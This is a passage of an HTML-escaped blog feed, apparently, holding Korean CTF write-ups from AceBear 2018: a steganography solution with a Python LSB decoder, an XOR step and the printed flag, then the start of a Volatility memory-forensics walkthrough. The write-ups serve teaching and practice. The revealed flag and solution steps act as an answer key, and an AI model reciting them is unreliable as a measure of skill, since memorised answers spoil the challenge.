+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'test'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hex'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;위 code로 서버로부터 받은 &lt;code class=&quot;highlighter-rouge&quot;&gt;encode data&lt;/code&gt;와 &lt;code class=&quot;highlighter-rouge&quot;&gt;flag_enc.png&lt;/code&gt;를 unhide 했을 때, 아래와 같은 문자열을 얻을 수 있었다. 무엇인가 복호화가 된다는 사실이 일단 실마리이다.&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg
+ python ./steg.py
+|vohenrbuq&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;nxe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg
+ python ./steg.py
+53:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;~&amp;gt;1&amp;amp;v1z4hu
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;굳이, server로부터 encode data를 주는 이유는 무엇일까? 해당 data로부터 알아내야할 것이 있다는 말이다. &lt;code class=&quot;highlighter-rouge&quot;&gt;flag_enc.png&lt;/code&gt;로부터 unhide 했을 때, 별 소득이 없었으므로 해당 결과 값에 영향을 미칠만한 항목을 찾아냈어야 했다. (이 부분에서도 꽤 많은 시간을 쏟았다.)&lt;/p&gt;
+
+&lt;p&gt;여러 data 를 server 로 send 하다가, &lt;code class=&quot;highlighter-rouge&quot;&gt;\x00&lt;/code&gt; 로만 16byte를 채워보내고 받은 encode data에 대해서 unhide 한 결과 식별할 수 있는 string(&lt;code class=&quot;highlighter-rouge&quot;&gt;OMG_YOU_BREAK_IT&lt;/code&gt;)을 얻을 수 있었다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg
+ python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; “print ‘&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;00’&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;16” | nc localhost 33338 | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; tmp.png
+
+jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg
+ python ./steg.py
+OMG_YOU_BREAK_IT
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;또 여기서, 삽질했던게 Null로 얻은 문자열 길이는 16byte인데 flag_enc.png 에서 얻은 문자열 길이는 14byte이다.. 기왕 내는거 길이 좀 맞춰서 내지;; 14byte 까지만 각각의 문자열을 xor 할 경우 flag를 확인할 수 있었다;;;&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;decode_imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;s&quot;&gt;'''Given a sequence of pixels, returns an iterator of characters
+    encoded in the image'''&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;iter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;xrange&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pixels&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;strxor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'flag_enc.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hex'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;im2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'tmp.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;data2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode_imdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;im2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getdata&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'hex'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data2&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;zip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/STEg
+ python ./steg.py
+53:&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;~&amp;gt;1&amp;amp;v1z4hu
+OMG_YOU_BREAK_IT
+zStep1k_st3p1k!!
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;솔직히, 맞추라고 낸 문제인가 애매하다.. Forensic이 아니라 그냥 MISC 느낌.. 어거지로 끼워 만든 문제 느낌이 너무 강하고, 쓸데 없는 삽질이 너무 많이 필요했다…;;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p align=&quot;right&quot;&gt;&lt;strong&gt;AceBear{zStep1k_st3p1k!!}&lt;/strong&gt;&lt;/p&gt;</content><author><name>suheyon.Jin</name></author><category term="[&quot;CTF&quot;]" /><category term="2018_acebear" /><category term="Forensic" /><category term="MISC" /><category term="Writeup" /><category term="steganography" /><summary type="html">Exercise</summary></entry><entry><title type="html">[2018_AceBear_CTF] Memory (951)</title><link href="http://localhost:4000/ctf/AceBear-CTF-Memory-951/" rel="alternate" type="text/html" title="[2018_AceBear_CTF] Memory (951)" /><published>2018-02-09T00:00:00+09:00</published><updated>2018-02-09T00:00:00+09:00</updated><id>http://localhost:4000/ctf/AceBear-CTF-Memory-951</id><content type="html" xml:base="http://localhost:4000/ctf/AceBear-CTF-Memory-951/">&lt;h2 id=&quot;exercise&quot;&gt;Exercise&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Download: Link
+author: f4k3r&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/exercise.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] exercise&lt;/p&gt;
+
+&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
+
+&lt;p&gt;Download link 를 통해 받은 파일을 확인해보면, memory dump raw 파일을 하나 확인할 수 있다. volatility를 이용해, imageinfo를 확인해보면 아래와 같은 imageinfo를 식별할 수 있다. (Windows7)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jsh05042@Macs-MacBook-Pro  ~/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/Memory
+ vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump.raw imageinfo
+Volatility Foundation Volatility Framework 2.6
+INFO    : volatility.debug    : Determining profile based on KDBG search...
+WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vtypes
+WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vtypes
+WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;vtypes
+          Suggested Profile&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86
+                     AS Layer1 : IA32PagedMemoryPae &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Kernel AS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                     AS Layer2 : FileAddressSpace &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/Users/Mac/Desktop/CTF/2018_Acebear_CTF/Forensic:MISC/Memory/dump.raw&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+                      PAE &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; : PAE
+                           DTB : 0x185000L
+                          KDBG : 0x8292ec28L
+          Number of Processors : 1
+     Image Type &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Service Pack&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; : 1
+                KPCR &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;CPU 0 : 0x8292fc00L
+             KUSER_SHARED_DATA : 0xffdf0000L
+           Image &lt;span class=&quot;nb&quot;&gt;date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2018-01-18 02:45:02 UTC+0000
+     Image &lt;span class=&quot;nb&quot;&gt;local date &lt;/span&gt;and &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt; : 2018-01-18 04:45:02 +0200
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;memory dump에 관련된 문제가 나왔을 때, 나같은 경우에는 가장 먼저 이상 프로세스가 없는지 확인한다. 이후, 이상 프로세스가 식별되는 경우에 해당 프로세스에 대한 덤프, 분석 등을 시도하며 별도로 이상한 프로세스가 식별되지 않을 경우 Command line, Registry, Shellbag 등 부가적인 정보, Network, Filelist 등에 대해 분석하는 식으로 보통 접근하는데 이번에도 앞서 언급한 행위 분석을 하는 과정 중 Filescan 에서 Document directory내에 아래와 같은 파일 목록을 확인할 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/2018-02-09-AceBear-CTF-Memory-951/filescan.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p align=&quot;center&quot;&gt;[그림] filescan list&lt;/p&gt;
+
+&lt;p&gt;식별되는 &lt;code class=&quot;highlighter-rouge&quot;&gt;\Device\HarddiskVolume2\Users\Administrator\Documents&lt;/code&gt; 내에서 확인되는 파일 목록 중 특이한 부분은 아래와 같다. 5개의 파일이 Document 폴더 내에 존재하는 것을 확인할 수 있는데 각각 rtf 파일 2개, python 파일 1개, gif 파일 1개, pdf 파일 1개이다.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x000000001e0ed5d0      8      0 R--rwd &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume2&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;ocument.rtf
+0x000000001fcaca30      8      0 R--rwd &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume2&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;sb_command.rtf
+0x000000001fcbc4c8      7      0 R--r-d &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume2&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\G&lt;/span&gt;IF.gif
+0x000000001fccbf80      8      0 R--rwd &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume2&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ackerrank.py
+0x000000001ff241d8      8      0 R--rwd &lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;evice&lt;span class=&quot;se&quot;&gt;\H&lt;/span&gt;arddiskVolume2&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&lt;span class=&quot;se&quot;&gt;\E&lt;/span&gt;thical Hacking.pdf
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dumpfiles&lt;/code&gt; command를 이용해, 해당 offset을 가지는 파일들을 추출해내는 작업을 수행함으로써 직접 각각의 파일을 확인할 수 있다. (Python 파일은 명시된 offset 값으로 바로 추출이 되지 않았지만, 문제 푸는데에는 지장이 없었으며 이 또한 MFT Entry offset을 참조하여 추출해낼 수는 있다.)&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10516  vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000001e0ed5d0 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./
+10517  vol &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./dump.raw &lt;span class=&quot;nt&quot;&gt;--profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Win7SP1x86_23418 dumpfiles &lt;span class=&quot;nt&quot;&gt;-Q&lt;/span&gt; 0x000000001fcaca30 &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; ./
